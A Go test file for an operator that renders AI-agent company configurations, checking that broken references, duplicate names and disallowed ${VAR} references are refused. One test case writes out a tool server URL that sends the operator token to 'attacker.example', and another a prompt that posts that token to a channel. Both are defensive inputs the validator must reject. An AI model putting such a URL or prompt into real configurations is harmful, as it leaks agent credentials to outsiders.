package render

import (
	"errors"
	"slices"
	"strconv"
	"strings"
	"testing"

	"sigs.k8s.io/yaml"

	"github.com/crewlet/crewlet-operator/api/v1alpha1"
	"github.com/crewlet/crewlet-operator/internal/engine"
	"github.com/crewlet/crewlet-operator/internal/secretref"
)

// TestCompanyRefusesWhatItCannotRender covers every reference between
// objects the API server cannot check, each broken on its own in an
// otherwise valid company. Each refusal must name the object and the field
// that hold the reference, with the reason the controller reports it with.
// fieldDisplayName is where a Seat's or Unit's name is set.
const fieldDisplayName = "spec.displayName"

func TestCompanyRefusesWhatItCannotRender(t *testing.T) {
	type refusal struct{ kind, name, field, reason string }
	const (
		fieldParent  = "spec.parentRef.name"
		fieldManages = "spec.manages[0].name"
		missingUnit  = "sre"
	)
	for _, c := range []struct {
		name   string
		mutate func(*Input)
		want   []refusal
	}{
		{
			name:   "a seat's unit is missing",
			mutate: func(in *Input) { seat(in, seatAna).Spec.UnitRef.Name = missingUnit },
			want:   []refusal{{KindSeat, seatAna, "spec.unitRef.name", v1alpha1.ReasonRefNotFound}},
		},
		{
			name:   "a unit's parent is missing",
			mutate: func(in *Input) { unit(in, unitPlatform).Spec.ParentRef.Name = "infra" },
			want:   []refusal{{KindUnit, unitPlatform, fieldParent, v1alpha1.ReasonRefNotFound}},
		},
		{
			name: "two units are each other's parent",
			mutate: func(in *Input) {
				unit(in, unitEngineering).Spec.ParentRef.Name = unitPlatform
				// A unit below the cycle is unreachable, but its own
				// reference resolves: only the cycle is reported.
				in.Units = append(in.Units, v1alpha1.Unit{
					ObjectMeta: unit(in, unitPlatform).ObjectMeta,
					Spec:       v1alpha1.UnitSpec{ParentRef: v1alpha1.LocalObjectReference{Name: unitPlatform}},
				})
				in.Units[len(in.Units)-1].Name = missingUnit
			},
			want: []refusal{
				{KindUnit, unitEngineering, fieldParent, v1alpha1.ReasonCycle},
				{KindUnit, unitPlatform, fieldParent, v1alpha1.ReasonCycle},
			},
		},
		{
			name:   "a unit is its own parent",
			mutate: func(in *Input) { unit(in, unitEngineering).Spec.ParentRef.Name = unitEngineering },
			want:   []refusal{{KindUnit, unitEngineering, fieldParent, v1alpha1.ReasonCycle}},
		},
		{
			name:   "a unit's lead is missing",
			mutate: func(in *Input) { unit(in, unitPlatform).Spec.LeadRef.Name = "bob" },
			want:   []refusal{{KindUnit, unitPlatform, "spec.leadRef.name", v1alpha1.ReasonRefNotFound}},
		},
		{
			name:   "a managed seat is missing",
			mutate: func(in *Input) { seat(in, seatJane).Spec.Manages[0].Name = "coo" },
			want:   []refusal{{KindSeat, seatJane, fieldManages, v1alpha1.ReasonRefNotFound}},
		},
		{
			name:   "a managed unit is missing",
			mutate: func(in *Input) { seat(in, seatCTO).Spec.Manages[0].Name = "sales" },
			want:   []refusal{{KindSeat, seatCTO, fieldManages, v1alpha1.ReasonRefNotFound}},
		},
		{
			name: "a managed unit is named like a seat",
			mutate: func(in *Input) {
				unit(in, unitPlatform).Spec.DisplayName = "Agent CTO"
			},
			want: []refusal{{KindSeat, seatCTO, fieldManages, v1alpha1.ReasonConflict}},
		},
		{
			name: "a seat's tool server is missing",
			mutate: func(in *Input) {
				seat(in, seatAna).Spec.MCP[0].Name = "notion"
				seat(in, seatAna).Spec.Sandbox.MCPServerRefs[0].Name = "notion"
			},
			want: []refusal{
				{KindSeat, seatAna, "spec.mcp[0].name", v1alpha1.ReasonRefNotFound},
				{KindSeat, seatAna, "spec.sandbox.mcpServerRefs[0].name", v1alpha1.ReasonRefNotFound},
			},
		},
		{
			name: "a unit's tool server is missing",
			mutate: func(in *Input) {
				unit(in, unitPlatform).Spec.MCP = []v1alpha1.MCPCredentials{{Name: "datadog", Env: []v1alpha1.MCPCredentialValue{{
					Name: "DD_API_KEY", ValueFrom: v1alpha1.SeatCredentialSource{SecretKeyRef: v1alpha1.SecretKeyReference{Name: "dd", Key: "apiKey"}},
				}}}}
			},
			want: []refusal{{KindUnit, unitPlatform, "spec.mcp[0].name", v1alpha1.ReasonRefNotFound}},
		},
		{
			name:   "a seat's model provider is missing",
			mutate: func(in *Input) { seat(in, seatCTO).Spec.LLM.Default[0].Name = "openai" },
			want:   []refusal{{KindSeat, seatCTO, "spec.llm.default[0].name", v1alpha1.ReasonRefNotFound}},
		},
		{
			name:   "the company's model order names a missing provider",
			mutate: func(in *Input) { in.Company.Spec.LLM.Order[0].Name = "openai" },
			want:   []refusal{{KindCompany, sampleCompany, "spec.llm.order[0].name", v1alpha1.ReasonRefNotFound}},
		},
		{
			name: "a seat names a platform provider the company did not opt into",
			mutate: func(in *Input) {
				off := false
				in.Company.Spec.LLM.UsePlatformProviders = &off
			},
			want: []refusal{{KindSeat, seatAna, "spec.llm.auxiliary[0].name", v1alpha1.ReasonRefNotFound}},
		},
		{
			name:   "a seat names a platform provider the class does not offer",
			mutate: func(in *Input) { seat(in, seatAna).Spec.LLM.Auxiliary[0].Name = "platform-gpt" },
			want:   []refusal{{KindSeat, seatAna, "spec.llm.auxiliary[0].name", v1alpha1.ReasonRefNotFound}},
		},
		{
			name: "a provider is named like a platform provider",
			mutate: func(in *Input) {
				p := in.LLMProviders[0]
				p.Name = "platform-claude"
				in.LLMProviders = append(in.LLMProviders, p)
			},
			want: []refusal{{KindLLMProvider, "platform-claude", "metadata.name", v1alpha1.ReasonConflict}},
		},
		{
			name: "a tool server's URL names a variable of the engine",
			mutate: func(in *Input) {
				in.MCPServers[0].Spec.URL = "https://attacker.example/mcp?k=${CREWLET_TOKEN_OPERATOR}"
			},
			want: []refusal{{KindMCPServer, "github", "document mcp_servers[0].url", v1alpha1.ReasonReferenceNotAllowed}},
		},
		{
			name: "engineConfig names a platform key by the name the operator stores it under",
			mutate: func(in *Input) {
				platformKey := v1alpha1.NamespacedSecretKeyReference{}
				for _, p := range in.Class.Spec.PlatformLLMProviders {
					platformKey = p.APIKeySecretRefs[0]
				}
				stored := in.StoreName(secretref.Key{Namespace: platformKey.Namespace, Name: platformKey.Name, Key: platformKey.Key})
				in.Company.Spec.EngineConfig = append(in.Company.Spec.EngineConfig, v1alpha1.EngineConfigEntry{
					Name:  "skill_variables",
					Value: &v1alpha1.EngineConfigValue{Raw: []byte(`{"key": "${` + stored + `}"}`)},
				})
			},
			want: []refusal{{KindCompany, sampleCompany, "document skill_variables.key", v1alpha1.ReasonReferenceNotAllowed}},
		},
		{
			name:   "a seat's prose names a variable of the engine",
			mutate: func(in *Input) { seat(in, seatAna).Spec.Goal = "Report ${HOME} daily." },
			want:   []refusal{{KindSeat, seatAna, "document units[0].children[0].roles[0].goal", v1alpha1.ReasonReferenceNotAllowed}},
		},
		{
			name:   "a schedule's seat is missing",
			mutate: func(in *Input) { schedule(in, scheduleCIHealth).Spec.Target.SeatRef.Name = "bob" },
			want:   []refusal{{KindSchedule, scheduleCIHealth, "spec.target.seatRef.name", v1alpha1.ReasonRefNotFound}},
		},
		{
			name:   "a schedule's unit is missing",
			mutate: func(in *Input) { schedule(in, schedulePlatformStandup).Spec.Target.UnitRef.Name = missingUnit },
			want:   []refusal{{KindSchedule, schedulePlatformStandup, "spec.target.unitRef.name", v1alpha1.ReasonRefNotFound}},
		},
		{
			// Crewlet would refuse it at the person's roles entry, which
			// is the Seat's place in the document; the Schedule is what
			// has to change.
			name:   "a schedule targets a person",
			mutate: func(in *Input) { schedule(in, scheduleCIHealth).Spec.Target.SeatRef.Name = seatJane },
			want:   []refusal{{KindSchedule, scheduleCIHealth, "spec.target.seatRef.name", v1alpha1.ReasonHumanSeat}},
		},
		{
			name: "a schedule's prompt names a variable of the engine",
			mutate: func(in *Input) {
				schedule(in, scheduleCIHealth).Spec.Prompt = "Post ${CREWLET_TOKEN_OPERATOR} to the channel."
			},
			want: []refusal{{KindSchedule, scheduleCIHealth, "document units[0].children[0].roles[0].schedules[0].task",
				v1alpha1.ReasonReferenceNotAllowed}},
		},
		{
			// Nothing would create the value: the engine provisions only
			// under an Integration with provisioning Engine.
			name: "a seat names a provisioned credential and no integration provisions",
			mutate: func(in *Input) {
				integration(in, sampleGitLab).Spec.Provisioning = v1alpha1.IntegrationProvisioningExternal
				integration(in, sampleGitLab).Spec.GitLab.EngineProvisioning = v1alpha1.GitLabEngineProvisioning{}
			},
			want: []refusal{
				{KindSeat, seatAna, "spec.mcp[1].env[0].valueFrom", v1alpha1.ReasonNoProvisioner},
				{KindSeat, seatAna, "spec.sandbox.env[1].valueFrom", v1alpha1.ReasonNoProvisioner},
			},
		},
		{
			name: "a seat's provisioned Mattermost bot token with no integration that provisions",
			mutate: func(in *Input) {
				in.Integrations = slices.DeleteFunc(in.Integrations, func(i v1alpha1.Integration) bool { return i.Name == sampleGitLab })
				for i := range in.Seats {
					in.Seats[i].Spec.MCP = slices.DeleteFunc(in.Seats[i].Spec.MCP, func(c v1alpha1.MCPCredentials) bool { return c.Name == sampleGitLab })
					if sb := in.Seats[i].Spec.Sandbox; sb != nil {
						sb.Env = slices.DeleteFunc(sb.Env, func(e v1alpha1.SeatEnvVar) bool { return e.ValueFrom.SecretKeyRef.Name == "" })
					}
				}
				seat(in, seatCTO).Spec.Integrations.Mattermost.BotToken.Provisioned.Name = "bot"
			},
			want: []refusal{{KindSeat, seatCTO, "spec.integrations.mattermost.botToken", v1alpha1.ReasonNoProvisioner}},
		},
		{
			name: "datadog routes alerts to a seat that does not exist",
			mutate: func(in *Input) {
				in.Integrations = append(in.Integrations, datadogIntegration("sre"))
			},
			want: []refusal{{KindIntegration, VendorDatadog, "spec.datadog.routeTo.seatRef.name", v1alpha1.ReasonRefNotFound}},
		},
		{
			name: "datadog routes alerts to a person",
			mutate: func(in *Input) {
				in.Integrations = append(in.Integrations, datadogIntegration(seatJane))
			},
			want: []refusal{{KindIntegration, VendorDatadog, "spec.datadog.routeTo.seatRef.name", v1alpha1.ReasonHumanSeat}},
		},
		{
			name: "gitlab gives an access level to a seat that does not exist",
			mutate: func(in *Input) {
				p := &integration(in, sampleGitLab).Spec.GitLab.EngineProvisioning
				p.AccessLevels = []v1alpha1.GitLabSeatAccess{{Name: "mallory", AccessLevel: v1alpha1.GitLabMaintainer}}
			},
			want: []refusal{{KindIntegration, sampleGitLab, "spec.gitlab.engineProvisioning.accessLevels[0].name", v1alpha1.ReasonRefNotFound}},
		},
		{
			name: "two integrations connect jira",
			mutate: func(in *Input) {
				jira := v1alpha1.JiraIntegration{
					URL:            "https://jira.example.com",
					TokenSecretRef: v1alpha1.SecretKeyReference{Name: "jira", Key: "apiToken"},
				}
				for _, name := range []string{"jira-a", "jira-b"} {
					i := *integration(in, "slack")
					i.Name = name
					i.Spec = v1alpha1.IntegrationSpec{CompanyRef: i.Spec.CompanyRef, Jira: jira}
					in.Integrations = append(in.Integrations, i)
				}
			},
			want: []refusal{{KindIntegration, "jira-b", "spec.jira", v1alpha1.ReasonConflict}},
		},
		{
			name: "two integrations connect one vendor",
			mutate: func(in *Input) {
				i := *integration(in, "slack")
				i.Name = "slack-2"
				in.Integrations = append(in.Integrations, i)
			},
			want: []refusal{{KindIntegration, "slack-2", "spec.slack", v1alpha1.ReasonConflict}},
		},

		// What Crewlet's own validation refuses as duplicates is refused
		// on every object involved, compared as Crewlet compares it.
		{
			name:   "two seats derive one handle",
			mutate: func(in *Input) { seat(in, seatAna).Spec.Handle = seatCTO },
			want: []refusal{
				{KindSeat, seatAna, "spec.handle", v1alpha1.ReasonConflict},
				{KindSeat, seatCTO, "spec.handle", v1alpha1.ReasonConflict},
			},
		},
		{
			name:   "two seats carry one name",
			mutate: func(in *Input) { seat(in, seatAna).Spec.DisplayName = "Agent CTO" },
			want: []refusal{
				{KindSeat, seatAna, fieldDisplayName, v1alpha1.ReasonConflict},
				{KindSeat, seatCTO, fieldDisplayName, v1alpha1.ReasonConflict},
			},
		},
		{
			name: "two seats claim one Slack account",
			mutate: func(in *Input) {
				seat(in, seatAna).Spec.Contact.SlackUserID = " U0FOUNDER"
			},
			want: []refusal{
				{KindSeat, seatAna, "spec.contact.slackUserID", v1alpha1.ReasonConflict},
				{KindSeat, seatJane, "spec.contact.slackUserID", v1alpha1.ReasonConflict},
			},
		},
		{
			name: "two seats claim one GitHub login, in another case",
			mutate: func(in *Input) {
				seat(in, seatAna).Spec.Contact.GitHubLogin = "Jane-Founder"
			},
			want: []refusal{
				{KindSeat, seatAna, "spec.contact.githubLogin", v1alpha1.ReasonConflict},
				{KindSeat, seatJane, "spec.contact.githubLogin", v1alpha1.ReasonConflict},
			},
		},
		{
			name:   "two units carry one name, in another case",
			mutate: func(in *Input) { unit(in, unitPlatform).Spec.DisplayName = "ENGINEERING" },
			want: []refusal{
				{KindUnit, unitEngineering, fieldDisplayName, v1alpha1.ReasonConflict},
				{KindUnit, unitPlatform, fieldDisplayName, v1alpha1.ReasonConflict},
			},
		},
		{
			name:   "a unit is named as another unit's id",
			mutate: func(in *Input) { unit(in, unitEngineering).Spec.DisplayName = "Platform" },
			want: []refusal{
				{KindUnit, unitEngineering, fieldDisplayName, v1alpha1.ReasonConflict},
				{KindUnit, unitPlatform, fieldDisplayName, v1alpha1.ReasonConflict},
			},
		},
	} {
		t.Run(c.name, func(t *testing.T) {
			in := companyCaseNamed(t, sampleCompany).input(t)
			c.mutate(in)
			doc, err := Company(in)
			if doc != nil {
				t.Errorf("a document was rendered despite the refusal")
			}
			refusals := RefErrors(err)
			got := make([]refusal, 0, len(refusals))
			for _, e := range refusals {
				got = append(got, refusal{e.Kind, e.Name, e.Field, e.Reason})
				if e.Message == "" || !strings.Contains(err.Error(), e.Message) {
					t.Errorf("%v: the message is not in the error: %q", e, err)
				}
			}
			if !slices.Equal(got, c.want) {
				t.Fatalf("refusals %v, want %v (err %v)", got, c.want, err)
			}
			if _, ok := errors.AsType[*RefError](err); !ok {
				t.Fatalf("errors.AsType finds no *RefError in %v", err)
			}
		})
	}
}

func seat(in *Input, name string) *v1alpha1.Seat {
	for i := range in.Seats {
		if in.Seats[i].Name == name {
			return &in.Seats[i]
		}
	}
	panic("no Seat " + name)
}

func unit(in *Input, name string) *v1alpha1.Unit {
	for i := range in.Units {
		if in.Units[i].Name == name {
			return &in.Units[i]
		}
	}
	panic("no Unit " + name)
}

func schedule(in *Input, name string) *v1alpha1.Schedule {
	for i := range in.Schedules {
		if in.Schedules[i].Name == name {
			return &in.Schedules[i]
		}
	}
	panic("no Schedule " + name)
}

func integration(in *Input, name string) *v1alpha1.Integration {
	for i := range in.Integrations {
		if in.Integrations[i].Name == name {
			return &in.Integrations[i]
		}
	}
	panic("no Integration " + name)
}

// TestAttributeFindsTheInnermostObject maps the paths of problems the
// engine's dry run could report on the Nimbus document, as the engine client
// hands over their segments, back to the objects that produced them.
func TestAttributeFindsTheInnermostObject(t *testing.T) {
	doc, err := Company(companyCaseNamed(t, sampleCompany).input(t))
	if err != nil {
		t.Fatal(err)
	}
	company := ObjectRef{KindCompany, sampleCompany}
	// Each path as the engine prints it beside the segments; none of these
	// keys holds a dot, so the printed form spells the segments exactly.
	for _, c := range []struct {
		path string
		want ObjectRef
	}{
		{"name", company},
		{"turn_engine.extension_enabled", company},
		{"providers.embeddings.model", company},
		{"providers.llm_order[1]", company},
		{"integrations.public_base_url", company},
		{"integrations.dashboard_base_url", company},
		{"providers.llm.anthropic.api_keys[0]", ObjectRef{KindLLMProvider, "anthropic"}},
		{"providers.llm.platform-claude.model", ObjectRef{KindEngineClass, "standard"}},
		{"mcp_servers[0].url", ObjectRef{KindMCPServer, sampleGitHub}},
		{githubWebhookSecret, ObjectRef{KindIntegration, sampleGitHub}},
		{"integrations.slack.typing_status", ObjectRef{KindIntegration, "slack"}},
		{"roles[0].contact", ObjectRef{KindSeat, seatJane}},
		{"units[0].lead", ObjectRef{KindUnit, unitEngineering}},
		{"units[0].roles[0].llm", ObjectRef{KindSeat, seatCTO}},
		{"units[0].children[0].space", ObjectRef{KindUnit, unitPlatform}},
		{"units[0].children[0].roles[0].sandbox.env", ObjectRef{KindSeat, seatAna}},
		{"units[0].children[0].roles[0].schedules[0].cron", ObjectRef{KindSchedule, scheduleCIHealth}},
		{"units[0].children[0].schedules[0].timezone", ObjectRef{KindSchedule, schedulePlatformStandup}},
		{"units[0].children[0].schedules", ObjectRef{KindUnit, unitPlatform}},
	} {
		p := PathOf(segmentsOf(t, c.path))
		if p.String() != c.path {
			t.Fatalf("segmentsOf(%q) reads back as %q", c.path, p)
		}
		got, ok := doc.Attribute(p)
		if !ok || got != c.want {
			t.Errorf("Attribute(%s) = %v, %v; want %v", p, got, ok, c.want)
		}
	}
	for _, path := range []string{"units[1]", "workers"} {
		if got, ok := doc.Attribute(PathOf(segmentsOf(t, path))); ok {
			t.Errorf("Attribute(%s) = %v; want no object for a path nothing rendered", path, got)
		}
	}
	if got, ok := doc.Attribute(PathOf(nil)); ok {
		t.Errorf("Attribute of a problem with no location = %v; want no object", got)
	}
}

// TestPathOfKeepsKeysAndIndexesApart reads the engine client's segments: an
// index must become an int and a key a string, whatever either looks like,
// or no Source path would ever match it.
func TestPathOfKeepsKeysAndIndexesApart(t *testing.T) {
	p := PathOf([]engine.Segment{{Key: "a.b"}, {Index: 0, IsIndex: true}, {Key: "0"}, {Key: ""}, {Index: 12, IsIndex: true}})
	want := Path{"a.b", 0, "0", "", 12}
	if !slices.Equal(p, want) {
		t.Fatalf("PathOf = %#v, want %#v", p, want)
	}
	if p := PathOf(nil); p != nil {
		t.Fatalf("PathOf(nil) = %#v, want nil: a problem the engine could not locate has no path", p)
	}
}

// segmentsOf takes apart a path the way the engine client hands it over:
// keys separated by dots, list indexes as [i].
func segmentsOf(t *testing.T, path string) []engine.Segment {
	t.Helper()
	var out []engine.Segment
	for part := range strings.SplitSeq(path, ".") {
		key, indexes, _ := strings.Cut(part, "[")
		out = append(out, engine.Segment{Key: key})
		if indexes == "" {
			continue
		}
		for index := range strings.SplitSeq(strings.TrimSuffix(indexes, "]"), "][") {
			i, err := strconv.Atoi(index)
			if err != nil {
				t.Fatalf("%q: index %q: %v", path, index, err)
			}
			out = append(out, engine.Segment{Index: i, IsIndex: true})
		}
	}
	return out
}

// TestEveryReferenceInADocumentIsTheOperators holds every rendered document to
// the invariant checkReferences enforces: a ${NAME} appears only as the whole
// of a value, and names a store entry of a Secret key the document declares
// in Refs, which the secret sync fills, or of a provisioned credential it
// declares in Provisioned, which the engine's provisioning fills. Anything
// else would be resolved by the engine from its own store or environment.
func TestEveryReferenceInADocumentIsTheOperators(t *testing.T) {
	for _, c := range companyCases() {
		t.Run(c.name, func(t *testing.T) {
			in := c.input(t)
			doc, err := Company(in)
			if err != nil {
				t.Fatal(err)
			}
			declared := map[string]bool{}
			for _, k := range doc.Refs {
				declared["${"+in.StoreName(k)+"}"] = true
			}
			for _, name := range doc.Provisioned {
				declared["${"+name+"}"] = true
			}
			var tree any
			if err := yaml.Unmarshal(doc.YAML, &tree); err != nil {
				t.Fatal(err)
			}
			var walk func(at string, v any)
			walk = func(at string, v any) {
				switch v := v.(type) {
				case string:
					if reference.MatchString(v) && !declared[v] {
						t.Errorf("%s holds %q, which is not a reference to a declared Secret key", at, v)
					}
				case []any:
					for i, item := range v {
						walk(at+"["+strconv.Itoa(i)+"]", item)
					}
				case map[string]any:
					for key, item := range v {
						if reference.MatchString(key) {
							t.Errorf("%s has the key %q", at, key)
						}
						walk(at+"."+key, item)
					}
				}
			}
			walk("", tree)
		})
	}
}

// providerCLI names the LLMProvider cliProvider makes.
const providerCLI = "claude-cli"

// cliProvider is a CLIAgent provider of Claude Code on a headless token, in
// the mode given.
func cliProvider(mode v1alpha1.CLIAgentMode) v1alpha1.LLMProvider {
	return v1alpha1.LLMProvider{
		Namespace: testNamespace,
		Name:      providerCLI,
		Spec: v1alpha1.LLMProviderSpec{
			CompanyRef:          v1alpha1.CompanyReference{Name: sampleCompany},
			LLMProviderSettings: v1alpha1.LLMProviderSettings{Type: v1alpha1.LLMProviderCLIAgent, Model: "sonnet"},
			CLI: v1alpha1.CLIAgentSettings{
				Agent: v1alpha1.CLIAgentClaudeCode,
				Mode:  mode,
				Auth: v1alpha1.CLIAgentAuth{
					TokenSecretRef: v1alpha1.SecretKeyReference{Name: providerCLI, Key: "oauthToken"},
				},
			},
		},
	}
}

// datadogIntegration is Datadog for the sample company, routing alerts that
// name no seat to the Seat named route.
func datadogIntegration(route string) v1alpha1.Integration {
	key := func(k string) v1alpha1.SecretKeyReference {
		return v1alpha1.SecretKeyReference{Name: "datadog", Key: k}
	}
	return v1alpha1.Integration{
		Namespace: testNamespace,
		Name:      VendorDatadog,
		Spec: v1alpha1.IntegrationSpec{
			CompanyRef:   v1alpha1.CompanyReference{Name: sampleCompany},
			Provisioning: v1alpha1.IntegrationProvisioningEngine,
			Datadog: v1alpha1.DatadogIntegration{
				WebhookTokenSecretRef: key("webhookToken"),
				RouteTo:               v1alpha1.DatadogRouteTo{SeatRef: v1alpha1.LocalObjectReference{Name: route}},
				Site:                  v1alpha1.DatadogSiteUS1,
				APIKeySecretRef:       key("apiKey"),
				AppKeySecretRef:       key("appKey"),
			},
		},
	}
}
